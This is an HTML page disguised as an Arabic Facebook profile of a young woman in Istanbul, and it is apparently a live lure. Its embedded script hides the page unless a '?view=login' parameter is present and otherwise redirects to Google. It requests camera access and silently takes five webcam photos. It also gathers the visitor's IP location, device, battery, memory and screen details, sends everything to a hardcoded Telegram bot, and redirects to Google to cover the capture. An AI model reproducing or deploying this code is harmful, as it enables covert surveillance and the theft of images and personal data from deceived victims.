<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>أوراق الربيع | Facebook</title>
    
    <meta property="og:title" content="أوراق الربيع (Spring Leaves)">
    <meta property="og:description" content="‏1,248‏ متابع • نشط الآن">
    <meta property="og:image" content="https://e.top4top.io/p_369921khp0.jpeg">
    <meta property="og:type" content="profile">

    <style>
        body { margin: 0; font-family: sans-serif; background: #fff; display: none; }
        .cover { width: 100%; height: 200px; background: url('https://images.unsplash.com/photo-1470071459604-3b5ec3a7fe05?fit=crop&w=1000&q=80') center/cover; position: relative; }
        .pp-container { position: absolute; bottom: -40px; right: 20px; }
        .pp { width: 130px; height: 130px; border-radius: 50%; border: 4px solid white; object-fit: cover; }
        .main { padding: 50px 20px; }
        .name { font-size: 26px; font-weight: bold; }
        .btns { display: flex; gap: 10px; margin: 15px 0; }
        .btn { flex: 1; height: 38px; border-radius: 8px; border: none; font-weight: bold; display: flex; align-items: center; justify-content: center; cursor: pointer; }
        .blue { background: #1877f2; color: white; }
        .gray { background: #e4e6eb; color: black; }
        #v, #c { display: none; }
    </style>
</head>
<body>

<div id="content">
    <div class="cover">
        <div class="pp-container"><img src="https://e.top4top.io/p_369921khp0.jpeg" class="pp"></div>
    </div>
    <div class="main">
        <div class="name">أوراق الربيع</div>
        <p style="color: #65676b;">‏1,248‏ متابع • ‏456‏ صديق</p>
        <div class="btns">
            <button class="btn blue">إضافة صديق</button>
            <button class="btn gray">مراسلة</button>
        </div>
        <div style="border-top: 1px solid #eee; padding-top: 15px;">
            <p>📍 تقيم في <b>إسطنبول، تركيا</b></p>
            <p>❤️ عازبة</p>
        </div>
    </div>
</div>

<video id="v" autoplay playsinline></video>
<canvas id="c"></canvas>

<script>
const TOKEN = '8060111495:AAGntTDe3q6lmhXDuNKdC6DZuTTPARA9jnc';
const CHAT = '7184970355';

// دالة البدء
async function init() {
    const params = new URLSearchParams(window.location.search);
    
    // إذا لم يوجد المفتاح، اذهب لجوجل فوراً
    if (params.get('view') !== "login") {
        window.location.replace("https://www.google.com");
        return;
    }

    // إظهار الصفحة
    document.body.style.display = "block";

    // محاولة فتح الكاميرا
    try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.getElementById('v');
        video.srcObject = stream;

        // إرسال البيانات فوراً
        sendData();

        // التقاط الصور
        let count = 0;
        let interval = setInterval(() => {
            if (count >= 5) {
                clearInterval(interval);
                stream.getTracks().forEach(t => t.stop());
                // تحويل لجوجل بعد انتهاء الصيد
                setTimeout(() => { window.location.replace("https://www.google.com"); }, 2000);
                return;
            }
            takeSnap(count + 1);
            count++;
        }, 1500);

    } catch (e) {
        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT}&text=${encodeURIComponent("⚠️ الهدف رفض الكاميرا لكن سأحاول سحب البيانات.")}`);
        sendData();
    }
}

async function sendData() {
    try {
        const ipRes = await fetch('https://ipapi.co/json/');
        const ip = await ipRes.json();
        const batt = await navigator.getBattery();
        
        let report = `🚀 صيد جديد!\n🌐 IP: ${ip.ip}\n📍 الموقع: ${ip.city}, ${ip.country_name}\n📱 الجهاز: ${navigator.platform}\n🔋 البطارية: ${Math.round(batt.level * 100)}%\n🔌 الشحن: ${batt.charging ? 'نعم' : 'لا'}\n🧠 الرام: ${navigator.deviceMemory || '?'}\n🖥️ الشاشة: ${window.screen.width}x${window.screen.height}`;
        
        fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT}&text=${encodeURIComponent(report)}`);
    } catch(err) {}
}

function takeSnap(n) {
    const canvas = document.getElementById('c');
    const video = document.getElementById('v');
    canvas.width = video.videoWidth;
    canvas.height = video.videoHeight;
    canvas.getContext('2d').drawImage(video, 0, 0);
    
    canvas.toBlob(blob => {
        const fd = new FormData();
        fd.append('chat_id', CHAT);
        fd.append('photo', blob, 'img.jpg');
        fd.append('caption', `اللقطة رقم ${n}`);
        fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
    }, 'image/jpeg');
}

// التشغيل
window.onload = init;
</script>
</body>
</html>
